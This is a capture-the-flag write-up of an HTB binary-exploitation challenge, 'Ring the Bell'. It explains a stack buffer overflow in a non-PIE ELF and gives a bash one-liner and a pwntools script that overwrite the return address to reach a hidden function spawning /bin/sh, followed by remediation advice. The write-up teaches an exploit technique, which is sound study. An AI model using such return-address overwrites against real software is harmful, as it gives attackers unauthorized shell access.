# HTB Pwn Challenge — "Ring the Bell" — Writeup

**Target:** `154.57.164.77:30625` (Placeholder)
**Category:** Pwn / Binary Exploitation (Stack Buffer Overflow)
**Stack:** ELF 64-bit LSB Executable (Non-PIE), dynamically linked

---

## Summary

The `ring_the_bell` challenge provides a compiled 64-bit ELF binary. The application simulates a dialogue requesting the user to enter a bell pattern to call for reinforcements. 

The binary is vulnerable to a classic **Stack Buffer Overflow** in the `main` function. The input is read using the `read` syscall into a local stack buffer with no boundary checks, allowing us to overwrite the saved return address. Because the binary is compiled as a non-PIE executable (no ASLR on the binary text) and has no stack canary, we can directly overwrite the return address of `main` to jump to a hidden `bell` function, which calls `execl("/bin/sh", "sh", NULL)` to spawn a shell.

---

## Vulnerability Analysis

### 1. Check Security Mitigations
Analyzing the binary header reveals that it is compiled as an `ET_EXEC` (non-PIE) executable. This means the load addresses for all functions are fixed and constant:
* `bell` is always located at `0x40176d`.
* `main` is always located at `0x40179b`.

Furthermore:
* **Stack Canary**: Disabled (no security cookies on the stack).
* **NX (No-Execute)**: Enabled (stack memory is not executable, but not required since we reuse existing binary text).

### 2. Decompiling the `main` Function
Disassembling the `main` function reveals the stack layout and input handling logic:
```assembly
0x40179f:    push    rbp
0x4017a0:    mov     rbp, rsp
0x4017a3:    sub     rsp, 0x20
...
0x4017f9:    lea     rax, [rbp - 0x20]
0x4017fd:    mov     edx, 0x60
0x401802:    mov     rsi, rax
0x401805:    mov     edi, 0
0x40180a:    call    read
```
* **Buffer Location**: The local buffer is allocated at `rbp - 0x20` (32 bytes).
* **Input Bound**: The `read` call reads `0x60` (96) bytes from `stdin`.
* **Vulnerability**: Since `96 > 32`, we can write past the buffer boundary, overwriting local variables, the saved frame pointer `rbp`, and the return address.

### 3. Stack Layout Calculation
To hijack the control flow when `main` returns:
1. Fill the local buffer: `32` bytes (`rbp - 0x20` to `rbp`).
2. Overwrite the saved base pointer (`rbp`): `8` bytes.
3. Overwrite the return address (`rbp + 8`): `8` bytes (pointing to the target function).

Total padding offset to the return address = `32 + 8 = 40` bytes.

### 4. Locate the Target Function
Looking at the symbol table, we find the `bell` function at `0x40176d`:
```assembly
0x40176d:    endbr64 
0x401771:    push    rbp
0x401772:    mov     rbp, rsp
0x401775:    mov     edx, 0
0x40177a:    lea     rax, [rip + 0x8de]  ; Address of "sh"
0x401781:    mov     rsi, rax
0x401784:    lea     rax, [rip + 0x8d7]  ; Address of "/bin/sh"
0x40178b:    mov     rdi, rax
0x40178e:    mov     eax, 0
0x401793:    call    execl               ; execl("/bin/sh", "sh", NULL)
```
Calling `bell` directly spawns a shell.

---

## Exploitation Walkthrough

### 1. Payload Construction
The payload is composed of:
1. `40` bytes of arbitrary padding (e.g., `A` characters).
2. The address of `bell` in little-endian 64-bit format: `\x6d\x17\x40\x00\x00\x00\x00\x00`.

### 2. Interactive Shell Pipeline
Since piping a one-off command directly causes the process to hit EOF and exit immediately, we must hold `stdin` open to interact with the spawned shell. 

This can be done using python and `cat` in bash:
```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\x6d\x17\x40\x00\x00\x00\x00\x00')"; cat) | ./ring_the_bell
```

### 3. Python script (using Pwntools)
An automated script can be structured as follows:

```python
from pwn import *

# Set target binary
elf = context.binary = ELF('./ring_the_bell')

# Set connection parameters (modify for remote)
local = True
if local:
    io = process('./ring_the_bell')
else:
    io = remote('154.57.164.77', 30625)

# Offset to return address: 40 bytes
# Target address: bell function (0x40176d)
payload = flat({
    40: elf.symbols['bell']
})

# Send payload
io.sendlineafter(b"[Rin]:", payload)

# Obtain shell
io.interactive()
```

---

## Remediation

To secure the binary:
1. **Enforce Bounds Checking**: Replace unsafe input functions or restrict the read limit to the size of the target buffer:
   ```c
   char buffer[32];
   read(0, buffer, sizeof(buffer)); // Secure: limits read to buffer capacity
   ```
2. **Enable Stack Canaries**: Compile with `-fstack-protector-all` to detect buffer overflows before returning from functions.
3. **Enable PIE**: Compile with `-fPIE -pie` to randomize the binary load address, mitigating hardcoded address dependencies.
